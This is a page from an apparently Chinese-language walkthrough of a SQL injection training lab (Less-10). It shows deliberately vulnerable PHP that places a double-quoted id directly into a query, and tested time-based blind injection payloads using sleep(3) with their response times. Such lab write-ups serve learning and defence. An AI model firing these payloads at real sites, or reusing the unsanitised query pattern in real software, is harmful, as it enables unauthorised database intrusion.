# Less-10

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 时间盲注 |
| **闭合方式** | `"` |
| **成败信号** | 响应时间 |
| **一句话** | 同上，双引号 |
| **核心 payload** | `?id=1" and sleep(3)--+` |

---

**GET · 时间盲注 · 双引号**

### 源码

```php
$id = '"' . $id . '"';
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
if($row) { echo 'You are in...........'; }
else     { echo 'You are in...........'; }
```

Less-9 的双引号版，闭合用 **`"`**。

### 通关 payload（实测）

```
?id=1" and 1=1--+      →   250ms
?id=1" and sleep(3)--+ →  3271ms   ✓ 注入成功
```

---

[← Less-9](Less-09.md) ｜ [返回目录](README.md) ｜ [Less-11 →](Less-11.md)